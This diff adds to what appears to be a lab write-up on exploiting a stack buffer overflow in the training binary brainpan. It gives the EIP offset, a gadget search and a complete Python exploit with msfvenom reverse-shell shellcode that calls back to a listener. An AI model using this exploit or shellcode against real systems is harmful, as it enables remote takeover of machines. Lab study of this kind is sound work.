@@ -83,7 +83,77 @@ Don't forget to attach the debugger to it, in this case I will use "WinDbg". Att
 
 ![](/assets/img/more_images/2024-10-25-2.png)
 
-We see that the "eip" is overwritten. We need to find an offset to overwrite the "eip" with our desired value.
+We see that the "eip" is overwritten. We need to find an offset to overwrite the "eip" with our desired value. Using two metasploit modules (msf-pattern_create, msf-patter_offset) we can obtain that offset. The specific offset is "524".
+
+Now, we have to jump to the "ESP", so we are going to use an interesting tool that help us to find some gadgets:
+
+```powershell
+.\rp-win-x86.exe -f ..\Preparation\1.stack_overflow\brainpan\brainpan.exe -r 5 > rop.txt
+```
+
+We check the rop.txt file:
+
+![imagen](https://github.com/user-attachments/assets/b599dc57-6c94-4058-a73b-a9698012c3f6)
+
+Bingo! We have the "jmp esp" address. We include it in out exploit and we add a padding of several "nops" to let the msfvenom shellcode to decode the badchars in execution.
+
+```py
+import struct
+import socket
+
+TARGET_IP = "127.0.0.1"
+TARGET_PORT = 9999
+target = (TARGET_IP, TARGET_PORT) 
+
+CRASH_LEN = 5000 
+OFFSET = 524
+
+#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.60 LPORT=6789  -f python -v shellcode -b '\x00' EXITFUNC=thread
+shellcode =  b""
+shellcode += b"\xdb\xd6\xd9\x74\x24\xf4\xbb\x4c\x44\x20\xf7"
+shellcode += b"\x5a\x31\xc9\xb1\x52\x31\x5a\x17\x03\x5a\x17"
+shellcode += b"\x83\x8e\x40\xc2\x02\xf2\xa1\x80\xed\x0a\x32"
+shellcode += b"\xe5\x64\xef\x03\x25\x12\x64\x33\x95\x50\x28"
+shellcode += b"\xb8\x5e\x34\xd8\x4b\x12\x91\xef\xfc\x99\xc7"
+shellcode += b"\xde\xfd\xb2\x34\x41\x7e\xc9\x68\xa1\xbf\x02"
+shellcode += b"\x7d\xa0\xf8\x7f\x8c\xf0\x51\x0b\x23\xe4\xd6"
+shellcode += b"\x41\xf8\x8f\xa5\x44\x78\x6c\x7d\x66\xa9\x23"
+shellcode += b"\xf5\x31\x69\xc2\xda\x49\x20\xdc\x3f\x77\xfa"
+shellcode += b"\x57\x8b\x03\xfd\xb1\xc5\xec\x52\xfc\xe9\x1e"
+shellcode += b"\xaa\x39\xcd\xc0\xd9\x33\x2d\x7c\xda\x80\x4f"
+shellcode += b"\x5a\x6f\x12\xf7\x29\xd7\xfe\x09\xfd\x8e\x75"
+shellcode += b"\x05\x4a\xc4\xd1\x0a\x4d\x09\x6a\x36\xc6\xac"
+shellcode += b"\xbc\xbe\x9c\x8a\x18\x9a\x47\xb2\x39\x46\x29"
+shellcode += b"\xcb\x59\x29\x96\x69\x12\xc4\xc3\x03\x79\x81"
+shellcode += b"\x20\x2e\x81\x51\x2f\x39\xf2\x63\xf0\x91\x9c"
+shellcode += b"\xcf\x79\x3c\x5b\x2f\x50\xf8\xf3\xce\x5b\xf9"
+shellcode += b"\xda\x14\x0f\xa9\x74\xbc\x30\x22\x84\x41\xe5"
+shellcode += b"\xe5\xd4\xed\x56\x46\x84\x4d\x07\x2e\xce\x41"
+shellcode += b"\x78\x4e\xf1\x8b\x11\xe5\x08\x5c\xde\x52\x13"
+shellcode += b"\xa0\xb6\xa0\x13\xc2\xc3\x2c\xf5\x98\xdb\x78"
+shellcode += b"\xae\x34\x45\x21\x24\xa4\x8a\xff\x41\xe6\x01"
+shellcode += b"\x0c\xb6\xa9\xe1\x79\xa4\x5e\x02\x34\x96\xc9"
+shellcode += b"\x1d\xe2\xbe\x96\x8c\x69\x3e\xd0\xac\x25\x69"
+shellcode += b"\xb5\x03\x3c\xff\x2b\x3d\x96\x1d\xb6\xdb\xd1"
+shellcode += b"\xa5\x6d\x18\xdf\x24\xe3\x24\xfb\x36\x3d\xa4"
+shellcode += b"\x47\x62\x91\xf3\x11\xdc\x57\xaa\xd3\xb6\x01"
+shellcode += b"\x01\xba\x5e\xd7\x69\x7d\x18\xd8\xa7\x0b\xc4"
+shellcode += b"\x69\x1e\x4a\xfb\x46\xf6\x5a\x84\xba\x66\xa4"
+shellcode += b"\x5f\x7f\x86\x47\x75\x8a\x2f\xde\x1c\x37\x32"
+shellcode += b"\xe1\xcb\x74\x4b\x62\xf9\x04\xa8\x7a\x88\x01"
+shellcode += b"\xf4\x3c\x61\x78\x65\xa9\x85\x2f\x86\xf8"
 
 
+payload = b"A" * OFFSET
+payload += struct.pack("<L",0x311712f3) # JMP ESP
+payload += b"\x90" * 10
+payload += shellcode
+payload += b"C" * (CRASH_LEN - len(payload))
 
+with socket.create_connection(target) as sock:
+    sock.recv(512) 
+
+    sent = sock.send(payload)
+    print(f"sent {sent} bytes")
+
+```
